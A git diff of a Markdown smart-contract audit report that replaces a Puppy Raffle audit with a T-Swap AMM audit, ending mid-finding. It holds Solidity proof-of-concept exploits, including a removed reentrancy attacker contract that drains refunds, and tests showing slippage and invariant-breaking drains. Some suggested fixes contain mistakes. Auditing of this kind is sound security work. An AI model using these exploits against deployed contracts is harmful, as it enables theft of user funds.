@@ -1,11 +1,16 @@
 ---
 title: Protocol Audit Report
 author: Seven Cedars
-date: May 14, 2024
+date: May 23, 2024
 header-includes:
   - \usepackage{titling}
   - \usepackage{graphicx}
 ---
+
+<!-- to render report run: 
+    pandoc report-formatted.md -o report.pdf --from markdown --template=eisvogel --listings 
+NB: remeber to run this in the audit_data folder! 
+-->
 
 \begin{titlepage}
     \centering
@@ -14,7 +19,7 @@ header-includes:
         \includegraphics[width=0.5\textwidth]{logo.pdf} 
     \end{figure}
     \vspace*{2cm}
-    {\Huge\bfseries Puppy Raffle Audit Report\par}
+    {\Huge\bfseries T-Swap Audit Report\par}
     \vspace{1cm}
     {\Large Version 1.0\par}
     \vspace{2cm}
@@ -44,21 +49,12 @@ Lead Auditors: Seven Cedars
 
 # Protocol Summary
 
-The protocol is a simple raffle contract that allows for a minimum of four players to enter a raffle. They have to pay a preset entrees fee to do so. After a set time frame a winner can be picked. The winner receives an NFT and a percentage of entree fees. A percentage of the entree fees are set aside (in this case twenty percent) for the owner to transfer to an address of their choice.
-
-The description from the documentation: 
-This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:
-
-1. Call the `enterRaffle` function with the following parameters:
-   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
-2. Duplicate addresses are not allowed
-3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
-4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
-5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.
+This project is meant to be a permissionless way for users to swap assets between each other at a fair price. You can think of T-Swap as a decentralized asset/token exchange (DEX). 
+T-Swap is known as an [Automated Market Maker (AMM)](https://chain.link/education-hub/what-is-an-automated-market-maker-amm) because it doesn't use a normal "order book" style exchange, instead it uses "Pools" of an asset. 
 
 # Disclaimer
 
-The Seven Cedars team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.
+The team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.
 
 # Risk Classification
 
@@ -76,604 +72,534 @@ We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate
 ## Scope 
 ```javascript
 ./src/
-#-- PuppyRaffle.sol
+#-- PoolFactory
+#-- TSwapPool.sol
 ```
 
 ## Roles
-- Owner: Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
-- Player: Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.
-
+- Liquidity Providers: Users who have liquidity deposited into the pools. Their shares are represented by the LP ERC20 tokens. They gain a 0.3% fee every time a swap is made. 
+- Users: Users who want to swap tokens.
+  
 # Executive Summary
 
 | Severity | Number of Issues found |
 | -------- | ---------------------- |
-| high     | 3                      |
-| medium   | 4                      |
+| high     | 4                      |
+| medium   | 2                      |
 | low      | 2                      |
-| gas      | 2                      |
-| info     | 9                      |
-| total    | 20                     |
+| info     | 11                     |
+| total    | 19                     |
 
 
 ## Issues found
 # Findings
 
 ## High
+### [H-1] Incorrect fee calculation in `TSwapPool::getInputAmountBasedOnOutput` causes protol to take too many tokens from users, resulting in lost fees.
 
-### [H-1] Reentrancy attack vulnerability in the `PuppyRaffle::refund` function, allows for draining of all funds from contract.  
+**Description:** The `getInputAmountBasedOnOutput` function is intended to calculate the amount of tokens a user should deposit given an amount of tokens of output tokens. However, the function currently miscalculates the amount. It scales the amount by 10_000 instead of 1_000. 
 
-**Description:** 
- `PuppyRaffle::refund` updates the `PuppyRaffle::players` array _after_ refunding the user. It does not follow the Check-Effect-Inetraction structure, and as result allows for an external contract to repeatly call the refund function without the  `PuppyRaffle::players` array being updated; draining the contract of all funds. It is a classic reentrancy attack. 
-
- ```javascript
-    function refund(uint256 playerIndex) public {
-        address playerAddress = players[playerIndex];
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-
-@>      payable(msg.sender).sendValue(entranceFee);
-@>      players[playerIndex] = address(0);
-
-        emit RaffleRefunded(playerAddress);
-    }
- ```
-
- A player who has entered the raflle can use a `fallback` or `receive` function to call the `PuppyRaffle::refund` function again on receiving the first refund. They could continue doing so until all funds have been drained from the contract.   
-
-**Impact:** 
-All fees paid by raffle entrants are at risk of being stolen. 
-
-**Proof of Concept:**
-
-1. User enters the raffle. 
-2. Attacker sets up a contract with a `fallback` funcion that calls `PuppyRaffle::refund`. 
-3. Attacker enters the raffle. 
-4. Attacker calls `PuppyRaffle::refund`, draining contract of funds. 
-
-<details>
-<summary> PoC </summary>
-
-Place the dollowing in `PuppyRaffleTest.t.sol`: 
-
-```javascript
-
-    function test_reentrancyRefund() public {
-        address[] memory players = new address[](4);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-
-        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle); 
-        address attackUser = makeAddr("attackuser"); 
-        vm.deal(attackUser, 1 ether);
-
-        uint256 startReentrancyAttackerBalance = address(attackerContract).balance; 
-        uint256 startPuppyRaffleBalance = address(puppyRaffle).balance; 
-
-        vm.prank(attackUser); 
-        attackerContract.attack{value: entranceFee}(); 
-
-        uint256 endReentrancyAttackerBalance = address(attackerContract).balance; 
-        uint256 endPuppyRaffleBalance = address(puppyRaffle).balance; 
-
-        console.log("start attacker balance", startReentrancyAttackerBalance); 
-        console.log("start puppyRaffle balance", startPuppyRaffleBalance); 
-
-        console.log("end attacker balance", endReentrancyAttackerBalance); 
-        console.log("end puppyRaffle balance", endPuppyRaffleBalance); 
-    }
-```
-
-And also this contract:
-
-```javascript
-
-    contract ReentrancyAttacker {
-        PuppyRaffle puppyRaffle;
-        uint256 entranceFee; 
-        uint256 attackerIndex; 
-
-        constructor(PuppyRaffle  _puppyRaffle) {
-            puppyRaffle = _puppyRaffle;
-            entranceFee = puppyRaffle.entranceFee(); 
-        }
-
-        function attack() external payable {
-            address[] memory players = new address[](1); 
-            players[0] = address(this); 
-            puppyRaffle.enterRaffle{value: entranceFee}(players);
-
-            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this)); 
-            puppyRaffle.refund(attackerIndex); 
-        }
-
-        function _stealMoney() internal {
-            if (address(puppyRaffle).balance >= entranceFee) {
-                puppyRaffle.refund(attackerIndex); 
-            }
-        }
-
-        receive() external payable {
-            _stealMoney(); 
-        }
-
-        fallback() external payable {
-            _stealMoney(); 
-        }
-    }
-```
-
-</details>
+**Impact:** Protocol takes more fees than expected from users. 
 
 **Recommended Mitigation:** 
-To prevent this, we should have the `PuppyRaffle::refund` function update the `PuppyRaffle::players` array before making an external call. Additionally, we have to move the event emission up as well.  
 
 ```diff
-
-    function refund(uint256 playerIndex) public {
-        address playerAddress = players[playerIndex];
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-
--       payable(msg.sender).sendValue(entranceFee);
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
-+       payable(msg.sender).sendValue(entranceFee);
-    }
-
+ {
+- return ((inputReserves * outputAmount) * 10_000) / ((outputReserves - outputAmount) * 997);
++ return ((inputReserves * outputAmount) * 1_000) / ((outputReserves - outputAmount) * 997);
+  } 
 ```
 
-### [H-2] The `PuppyRaffle::selectWinner` is only pseudo random. It allows users to influence and predict outcome of raffle and hence enable gaming the outcome of the puppy NFT raffle. 
+### [H-2] No Slippage protection in `TSwapPool::swapExactOutput` causes users to potentially receive way fewer tokens.
 
-**Description:** 
-Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together creates a predictable final number. It is not a proper random number. Malicious users can manipulate the values or know them ahead of time, allowing them to choose the winner of the raffle ahead of time. 
+**Description:** The `swapExactOutput` does not include any sort of slippage protection. This function is similar to `TSwapPool::swapExactInput` where the function specifies `minOutputAMount`. The `swapExactOutput` function should include a `maxInputAMount`. 
 
-Also, it allows users to front-run the outcome of the raffle and request refund if they are not the winner. 
-
-**Impact:** 
-Any user can influence the outcome of the raffle and the rareness of the NFT puppy. 
+**Impact:** If market conditions change, user might pay far more for tokens than they expected. 
 
 **Proof of Concept:**
-1. Users can know ahead of time the `block.timestamp` and `block.difficulty` and use this to predict and decide to participate. 
-2. Users can mine/manipulate their `msg.sender` value to result in their address being used to generate a winner. 
-3. Users can revert `PuppyRaffle::selectWinner` transaction if they don't like the winner of the resulting puppy. 
-
-**Recommended Mitigation:** 
-Use of off-chain verified random number generator. Most popular one is Chainlink VRF. 
-
-### [H-3] Integer overflow of `PuppyRaffle::totalFees` causes loss of fees.
-
-**Description:** 
-In solidity versions prior to `0.8.0` integers were subject to integer overflows. 
-
-```javascript 
-uint64 myVar = type(uint64).max
-// 18446744073709551615
-myVar = myVar + 1
-// myVar will be 0. 
-```
-
-**Impact:** 
-`PuppyRaffle:totalFees` accumulates fees for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if `PuppyRaffle:totalFees` overflows, the amount accumulated will be incorrect, leaving fees permanently stuck in the contract. 
-
-**Proof of Concept:**
-1. We enter 4 players into the raffle and check the amount of fees collected. 
-2. We calculate that it will take less than 25 runs of four players to overflow `totalFees`. 
-3. We create a loop, run the raffle 25 times.
-4. We observe that `totalFees` is not the same as `address(puppyRaffle).balance`.  
-5. You will be unable to withdraw any fees due to the following line: 
-
-```javascript
-    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
-```
-You could `selfDestruct` a contract to send ETH to the contract and have the amounts match, this is clearly not the intended design of the contract. At one point `balance` of the contract will be too high for this approach to work.  
+1. Price of 100 weth is now 100 poolToken. 
+2. User inputs `swapExactOutput` looking for 10 weth. 
+   1. inputToken = poolToken
+   2. output token = weth
+   3. output amount = 10
+   4. deadline is blocknumber. 
+3. Funciton does not offer maxInputAmount. 
+4. While transaction is in mempool. Someone swaps pooltoken for weth. - the exact same trade. 
+5. poolToken will now drop in value, meaning that user will pay more. If this happens with Huge amounts, the difference will be huge. 
 
 <details>
 <summary> PoC </summary>
+- step 1: fix finding [H-1] Incorrect fee calculation, as this render proper exchange based on output incorrect. In `TSwapPool::getInputAmountBasedOnOutput` change the following lines:
+   
+```diff
+ {
+- return ((inputReserves * outputAmount) * 10_000) / ((outputReserves - outputAmount) * 997);
++ return ((inputReserves * outputAmount) * 1_000) / ((outputReserves - outputAmount) * 997);
+  } 
+``` 
 
-Place the dollowing in `PuppyRaffleTest.t.sol`: 
+Step 2: Place the dollowing in `TSwapPool.t.sol`: 
 
 ```javascript
-    function test_overflowTotalFee() public {
-        address[] memory players = new address[](4);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        uint256 totalFeesSingleRun; 
-        uint64 mockTotalFees; 
 
-        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
+    function test_lackingSlippageProtection () public {
+        vm.startPrank(liquidityProvider);
+        weth.approve(address(pool), 100e18);
+        poolToken.approve(address(pool), 100e18);
+        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
+        vm.stopPrank();
+
+        // After we swap, there will be ~110 tokenA, and ~91 WETH
+        // 100 * 100 = 10,000
+        // 110 * ~91 = 10,000
+        // meaning we should expect to pay ~11 in tokenA for ~9 in weth. 
+        uint256 expectedPayment = 11e18;
         
-        puppyRaffle.selectWinner(); 
-        puppyRaffle.withdrawFees(); 
+        // The liquidity provider now comes around and does a big swap poolTokens -> wEth 
+        uint256 minOutputAmount = 9e18; 
+        vm.startPrank(liquidityProvider);
+            poolToken.approve(address(pool), 100e18);
+            pool.swapExactInput(
+                poolToken, // = inputToken 
+                25e18, // = inputAMount
+                weth, // = outputToken 
+                minOutputAmount, // = outputAmount
+                uint64(block.timestamp)); // deadline
+        vm.stopPrank();
+
+        uint256 poolTokenBalanceuserBefore = poolToken.balanceOf(user); 
         
-        totalFeesSingleRun = address(99).balance;
-        console.log("fee return from a single run of 4 players: ", totalFeesSingleRun); 
+        vm.startPrank(user);
+        poolToken.approve(address(pool), 100e18);
+        pool.swapExactOutput(
+            poolToken, // = inputToken 
+            weth, // = outputToken 
+            9e18, // = outputAmount 
+            uint64(block.timestamp)); // deadline
+        vm.stopPrank();
 
-        for (uint256 i; i < 25; i++) {
-            puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-            vm.warp(block.timestamp + duration + 1);
-            vm.roll(block.number + 1);
-            puppyRaffle.selectWinner(); 
+        uint256 poolTokenBalanceUserAfter = poolToken.balanceOf(user); 
+        console.log("Difference between expected and actual payment: ", (poolTokenBalanceuserBefore - poolTokenBalanceUserAfter) - expectedPayment); 
 
-            mockTotalFees = mockTotalFees + uint64(totalFeesSingleRun); 
-        }
-        
-        console.log("balance at puppyRaffle: ", address(puppyRaffle).balance); 
-        console.log("balance of mockTotalFees", mockTotalFees); 
-
-        assert(mockTotalFees != address(puppyRaffle).balance); 
+        assert(poolTokenBalanceuserBefore - poolTokenBalanceUserAfter > expectedPayment);
     }
 ```
 </details>
 
+**Recommended Mitigation:** We should include a `maxInputAmount` so the user has a guarantee they will only spend up until a certain amount. 
+```diff
+    function swapExactOutput(
+        IERC20 inputToken,
+        IERC20 outputToken,
+        uint256 outputAmount,
++       uint256 maxInputAmount,
+        uint64 deadline
+    )
+.
+.
+.
+        inputAmount = getInputAmountBasedOnOutput(outputAmount, inputReserves, outputReserves);
+        _swap(inputToken, inputAmount, outputToken, outputAmount);
++ if (inputamount > maxInputAmount) {
++  revert(); 
++ }       
+```
+
+### [H-3] `TSwapPool::sellPoolTokens` mismatches input an doutput tokens, causing users to receive the incorrect amount of tokens. 
+
+**Description:** The `sellPoolTokens` is intended to allow users to easily sell poolTokens for weth in exchange. Users indicate how many poolTokens they are willing to sell. How the function currently miscalculates the swapped amount. 
+
+This is because the `swapExactOutput` is called, instead of the `swapExactInput`. 
+
+**Impact:** Users will swap the wrong amoung of tokens, which is a severe disruption of protocol functionality. 
+
+**Proof of Concept:**
+1. User wants to exchange 10 poolTokens. 
+2. User inputs the `sellPoolTokens` function: 
+   1. poolTokenAmount = 10
+3. Function calls `swapExactOutput`
+   1. poolToken = token to retrieve from user 
+   2. wethToken = token to send to user
+   3. ouputAmount = 10 (= amount of weth to send to user). 
+   4. uint64(block.timestamp)
+4. The amount of poolTokens is calculated on the basis of costing 10 weth, instead of sending 10 poolTokens for variable amount of weth.
+5. Resulting in incorrect swap. 
+
+<details>
+<summary> PoC </summary>
+- step 1: fix finding [H-1] Incorrect fee calculation, as this render proper exchange based on output incorrect. In `TSwapPool::getInputAmountBasedOnOutput` change the following lines:
+   
+```diff
+ {
+- return ((inputReserves * outputAmount) * 10_000) / ((outputReserves - outputAmount) * 997);
++ return ((inputReserves * outputAmount) * 1_000) / ((outputReserves - outputAmount) * 997);
+  } 
+``` 
+
+Place the dollowing in `TSwapPool.t.sol`: 
+
+```javascript
+
+   function test_incorrectAmountsAtSellPoolTokens () public {
+        vm.startPrank(liquidityProvider);
+        weth.approve(address(pool), 100e18);
+        poolToken.approve(address(pool), 100e18);
+        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
+        vm.stopPrank();
+
+        uint256 poolTokensToSell = 5e18; 
+        uint256 poolTokenBalanceUserBefore = poolToken.balanceOf(user); 
+        
+        vm.startPrank(user);
+        poolToken.approve(address(pool), 100e18);
+        weth.approve(address(pool), 100e18);
+        pool.sellPoolTokens(poolTokensToSell);
+        vm.stopPrank();
+
+        uint256 poolTokenBalanceUserAfter = poolToken.balanceOf(user); 
+
+        assert(poolTokenBalanceuserBefore - poolTokenBalanceUserAfter != poolTokensToSell);
+    }
+
+```
+</details>
 
 **Recommended Mitigation:** 
-1. Use a newer version of solidity, and use `uint256` insetad of `uint64`. 
-2. You could also use `safeMath` library from OpenZeppelin for versions below `0.8.0`. 
-3. Remove the balance check from `PuppyRaffle::withdrawFees`. 
+Consider changing the implementation to use `swapExactInput` instead of `swapExactOutput`. Note that this would also require changing the `sellPoolTokens` functionality to accept a new parameter: `minWethToReceive` as it needs to be passed to `swapExactOutput`.  
+
+```diff
+    function sellPoolTokens(uint256 poolTokenAmount) external returns (uint256 wethAmount) {
+-      return swapExactOutput(i_poolToken, i_wethToken, poolTokenAmount, uint64(block.timestamp));
++      return swapExactInput(i_poolToken, poolTokenAmount,  i_wethToken, minWethToReceive, uint64(block.timestamp));
+    }
+
+Additionally, it would be good to add a deadline to the function as there currently is none.  
+
+```
+
+### [H-4] In `TSwapPool::_swap` the extra tokens goven to users after every `swapCount`, breaks the invariant of `x * y = k`. 
+ 
+**Description:** The protocol follows a strict invariant of `x * y = k`. Where
+- `x`: The Balance of the pool token.
+- `y`: The Balance of the WETH 
+- `k` the contant product of the two balances. 
+
+This means that whenever the balance change in the protocol, the ration between the two amounts should remain constant. However, this is broken due to the extra incentive in the `_swap` function. It means that the funds will be drained over time.
+
+The following block of code is responsible for the issue: 
+```javascript
+        swap_count++;
+        if (swap_count >= SWAP_COUNT_MAX) {
+            swap_count = 0;
+            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
+        }
+```
+
+**Impact:** A user can drain the protocol by making many swaps. 
+
+In short, the protocols core invariant is broken.  
+
+**Proof of Concept:**
+1. The user swaps 10 times and collects the extra incentive tokens. 
+2. The user continues to swap until all the protocols funds are drained.  
+
+<details>
+<summary> PoC </summary>
+
+```javascript 
+    function testInvariantBroken() public {
+        vm.startPrank(liquidityProvider);
+        weth.approve(address(pool), 100e18);
+        poolToken.approve(address(pool), 100e18);
+        pool.deposit(100e18, 100e18, 100e18, uint64( block.timestamp));
+        vm.stopPrank();
+
+        uint256 outputWeth = 1e17;
+        uint256 numberOfSwaps = 10; 
+        int256 startingY = int256(weth.balanceOf(address(pool)));
+        int256 expectedDeltaY = int256(-1) * int256(outputWeth);
+
+        vm.startPrank(user);
+        for (uint256 i; i < numberOfSwaps; i++) {
+            poolToken.approve(address(pool), type(uint256).max);
+            pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
+        }
+        vm.stopPrank();
+
+        uint256 endingY = weth.balanceOf(address(pool));
+        int256 actualDeltaY = int256(endingY) - int256(startingY);
+
+        vm.assertEq(expectedDeltaY, actualDeltaY); 
+    }
+```
+</details>
+
+**Recommended Mitigation:** Remove the extra incentive mechanism is the most straightforward solution.
 
 ```diff 
--    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+-     swap_count++;
+-        if (swap_count >= SWAP_COUNT_MAX) {
+-            swap_count = 0;
+-            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
+-        }
+
 ```
 
-There are more attack vectors related to this sentence. We recommend to remove it completely.  
 
-## Medium
-
-### [M-1] An unbound loop at `PuppyRaffle::enterRaffle` creates a possibility for a denial-of-service(DoS) attack, incrementing gas cost for future entrees. 
-
-**Description:** The `PuppyRaffle::enterRaffle` loops through an array of players `players` to check for duplicates. The array `players` is unbound. As the length of `players` increases, the cost to enter the raffle for new players increases as a longer array needs to be checked for duplicates. As a result, early entrants pay little in gas fees, later entrants (much) more. 
-
-```javascript 
-// audit: dos attack 
-@>  for (uint256 i = 0; i < players.length - 1; i++) {
-      for (uint256 j = i + 1; j < players.length; j++) {
-          require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-      }
-  }
-```
-
-**Impact:** The gas costs for raffle entrants will increase as more players enter the raffle. This will discourage later players to enter; and causing a rush at the start. 
-
-An Attacker might make the `players` array so long, that no-one else can enter and guaranteeing a win.  
-
-**Proof of Concept:**
-If we have two sets of a hundred players, gas cost is as follows: 
-- gas used in first 100 players: 6,252,047
-- gas used in second 100 players: 18,068,137
-
-The second set pays more than three times as much as the first set fo players. 
-
-<details>
-<summary> PoS </summary>
-Place the following code in `PuppyRaffleTest.t.sol`.
-
-```javascript 
-  function test_DenialOfService() public {
-      vm.txGasPrice(1); 
-
-      uint256 numberOfPlayers = 100; 
-      address[] memory players = new address[](numberOfPlayers);
-      for (uint160 i; i < numberOfPlayers; i++) {
-          players[i] = address(i); 
-      }
-      uint256 gasStart = gasleft(); 
-      puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayers}(players);
-      uint256 gasEnd = gasleft(); 
-
-      uint256 gasUsed = (gasStart - gasEnd) * tx.gasprice; 
-      console.log("gas used in first 100 players: ", gasUsed); 
-
-      uint256 numberOfPlayersTwo = 100; 
-      address[] memory playersTwo = new address[](numberOfPlayersTwo);
-      for (uint160 i; i < numberOfPlayersTwo; i++) {
-          playersTwo[i] = address(i + numberOfPlayers); 
-      }
-      uint256 gasStartTwo = gasleft(); 
-      puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayersTwo}(playersTwo);
-      uint256 gasEndTwo = gasleft(); 
-
-      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice; 
-      console.log("gas used in second 100 players: ", gasUsedSecond); 
-      
-      assert(gasUsed < gasUsedSecond); 
-  }
-```
-</details>
-
-**Recommended Mitigation:** There a few recommendations. 
-
-1. Consider allowing multiple addresses. 
-2. Create a mapping. This would allow constant time look up if players has entered.
-
-### [M-2] unsafe cast of uint256 to uint64 at `PuppyRaffle::selectWinner`.  
+## Medium 
+### [M-1] At `TSwapPool::deposit` the `deadline` parameter is set but not used. As a result, a user deposit that should fail, will pass. Severe disruption of protocol.
 
 **Description:** 
-The `fee` variable is `uint256` while totalFees is `uint64`. This will cause `uint64(fee)`, if its value is higher than `type(uint64).max`, to give an incorrect value. 
+At the `TSwapPool::deposit` the `deadline` parameter is ignored. It means the function allows deposits even though the deadline has passed. 
 
-```javascript 
-    totalFees = totalFees + uint64(fee);
-```
+**Impact:**
+Transactions can be completed at moments after deadline, possibly during averse market conditions. 
 
-**Impact:** 
-Fees will be incorrectly accumulated if fee is larger than `type(uint64).max`. 
-
-**Proof of Concept:**
-<details>
-<summary> PoC </summary>
-
-Place the dollowing in `PuppyRaffleTest.t.sol`: 
-
-```javascript
-    function test_overflowTotalFee() public {
-        address[] memory players = new address[](4);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        uint256 totalFeesSingleRun; 
-        uint64 mockTotalFees; 
-
-        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-        
-        puppyRaffle.selectWinner(); 
-        puppyRaffle.withdrawFees(); 
-        
-        totalFeesSingleRun = address(99).balance;
-        console.log("fee return from a single run of 4 players: ", totalFeesSingleRun); 
-
-        for (uint256 i; i < 25; i++) {
-            puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-            vm.warp(block.timestamp + duration + 1);
-            vm.roll(block.number + 1);
-            puppyRaffle.selectWinner(); 
-
-            mockTotalFees = mockTotalFees + uint64(totalFeesSingleRun); 
-        }
-        
-        console.log("balance at puppyRaffle: ", address(puppyRaffle).balance); 
-        console.log("balance of mockTotalFees", mockTotalFees); 
-
-        assert(mockTotalFees != address(puppyRaffle).balance); 
-    }
-```
-</details>
+**Proof of Concept:** The `deadline` parameter is ignored.  
 
 **Recommended Mitigation:** 
-1. Use a newer version of solidity, and use `uint256` insetad of `uint64`. 
-2. You could also use `safeMath` library from OpenZeppelin for versions below `0.8.0`. 
-3. Remove the balance check from `PuppyRaffle::withdrawFees`.
-   
-### [M-3] Smart Contract wallets raffle winners without a `receive` or `fallback` function will block start of new raffle. 
-
-**Description:** The `PuppyRaffle::selectWinner` function resets the lottery. However, if the winner is a smart contract without a `receive` or `fallback` function (and hence rejects payment) the lottery will not be able to reset. 
-
-Users can call `selectWinner` again until a EOA or proper smart contract is selected as winner. But this can get quite expensive due to the gas cost of rerunning the `PuppyRaffle:selectWinner` function. 
-
-**Impact:** The `PuppyRaffle::selectWinner` function can revert many times, making resetting the raffle challenging. 
-
-Also, the winnings would not be paid out to the incorrect smart contract, with someone else taking their winnings. 
-
-**Proof of Concept:**
-1. 10 smart contracts enter the raffle. None of them have `receive` or `fallback` functions. 
-2. The lottery ends. 
-3. The `selectWinner` function will not work - even though the lottery has ended. 
-
-**Recommended Mitigation:** 
-1. Do not allow smart contracts as entrants (not recommended). 
-2. Create a mapping `address winners` -> `uint256 price`, and allow entrants themselves to retreive their winnings through a new `claimPrize` function. (Recommended). 
-
-Generally, it is best practice to have users _pull_ funds from a contract, instead of _pushing_ funds to users. 
-
-### [M-4] Player with index 0 cannot call the `PuppyRaffle::refund` function, hence will not be able to get a refund.  
-
-**Description:** The `PuppyRaffle::refund` function contains a check that the player does not have index 0 (as this is used for non-existent players, see bug above). This means that if the player at index (0) attempts to get a refund, the `PuppyRaffle::refund`  function will revert. 
-
-```javascript
-    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-```
-
-**Impact:** In every raffle there will be one player - the very first one that entered the raffle and has index 0 - that will not be able to withdraw funds. 
-
-**Proof of Concept:**
-1. Have four players enter the raffle. 
-2. Call refund on player index 0. 
-3. The function will revert. 
-
-**Recommended Mitigation:** 
-`PuppyRaffle::getActivePlayerIndex` should return a `int256` (instead of `uint256`); and have a -1 return if the player has not entered the raffle. `PuppyRaffle::refund` can use getActivePlayerIndex to check if player address returns -1. 
-
-## Low
-
-### [L-1] `PuppyRaffle::getPlayerIndex` returns 0 for non-existent players, and for player 0. It might mean that player 0 might incorrectly think they have not entered the raffle. 
-
-**Description:** 
-If a player is at nidex 0 in the `PuppyRaffle::players` array, `PuppyRaffle::getPlayerIndex` returns 0. But `PuppyRaffle::getPlayerIndex` will also return 0 if a player is not in the `PuppyRaffle::players` array. 
-
-```javascript 
-    function getActivePlayerIndex(address player) external view returns (uint256) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == player) {
-                return i;
-            }
-        }
-@>        return 0;
-    }
-```
-
-**Impact:** 
-A player at index 0 might incorrectly think they have not entered the raffle and try and enter again, waisting gas. 
-
-**Proof of Concept:**
-1. User enters raffle as first player, enters at index 0. 
-2. Checks `PuppyRaffle::getPlayerIndex` to get index. Function returns 0. 
-3. Following the documentation, the player assumes they have not entered the raffle correctly.  
-
-**Recommended Mitigation:** 
-Best solution is to create a function that returns a `int256` (instead of `uint256`) and have a -1 return if the player has not entered the raffle. 
-
-Other solutions are: 
-- revert the function if player has not enetered, instead of returning 0. 
-- reserving 0 and entering the first player at index 1. 
-
-### [L-2] Loop contains `require`/`revert` statements
-
-Avoid `require` / `revert` statements in a loop because a single bad item can cause the whole transaction to fail. It's better to forgive on fail and return failed elements post processing of the loop
-
-- Found in src/PuppyRaffle.sol [Line: 99](src/PuppyRaffle.sol#L99)
-
-	```javascript
-	     for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
-	```
-
-## Gas 
-
-### [G-1] Unchanged state variables should be declared immutable. 
-
-Reading from storage is much more expansive than reading from a constant or immutable variable. 
-
-Instances:
--  `PuppyRaffleTest.t.sol::raffleDuration` should be `immutable`. 
--  `PuppyRaffleTest.t.sol::commonImageUri` should be `constant`. 
--  `PuppyRaffleTest.t.sol::rareImageUri` should be `constant`.
--  `PuppyRaffleTest.t.sol::legendaryImageUri` should be `constant`.
--  
-
-### [G-2] Storage in a loop should be cached.
-
-Reading from storage is gas expensive. Everytime you call players.length you read from storage. PlayersLength reads from memory which is mor egas efficient. 
+Include a require check to check if the deadline passed. The checks can be used in the form of already existing modifiers: 
 
 ```diff
-+   uint256 playersLength = players.length;
--   for (uint256 i = 0; i < players.length - 1; i++) {
-+   for (uint256 i = 0; i < playersLength - 1; i++) {
--           for (uint256 j = i + 1; j < players.length; j++) {
-+           for (uint256 j = i + 1; j < playersLength; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-    }
-
+    function deposit(
+        uint256 wethToDeposit,
+        uint256 minimumLiquidityTokensToMint,
+        uint256 maximumPoolTokensToDeposit,
+        uint64 deadline
+    )
+        external
++       revertIfDeadlinePassed(deadline)
+        revertIfZero(wethToDeposit)
+        returns (uint256 liquidityTokensToMint)
+    {
 ```
+
+### [M-2] Rebase, fee-on-transfer and ERV-777 tokens break the protocol.
+
+Any token that adds functionality to the basic transfer functionality of ERC-20 will cause the invariant of the protocol to break. 
+
+
+## Low 
+### [L-1] The `TSwapPoll::LiquidityAdded` event has parameters out of order. 
+
+**Description:** When the `LiquidityAdded` event is emitted at the `TSwapPoll::_addLiquidityMintAndTransfer` function, the `poolTokensToDeposit` and `wethToDeposit` are swapped. 
+
+**Impact:** Event emits incorrect information, leading to off-chain functions potentially malfunctioning. 
+
+**Recommended Mitigation:** 
+
+```diff
+  emit LiquidityAdded(msg.sender, 
+-   poolTokensToDeposit, wethToDeposit
++   wethToDeposit, poolTokensToDeposit
+    );
+```
+
+
+### [L-2]: At function `TSwapPool::swapExactInput` the `uint256 output` returns incorrect value . 
+
+**Description:** The `swapExactInput` function is expected to return the actual amount of token bought by the user. However, while it has a return parameter `output`, it is never assigned a value. It also does not use an explicit return statement. 
+
+**Impact:** The return value will always be 0. 
+
+**Proof of Concept:** 
+
+**Recommended Mitigation:** 
+
+- Found in src/TSwapPool.sol 
+
+```diff 
+        public
+        revertIfZero(inputAmount)
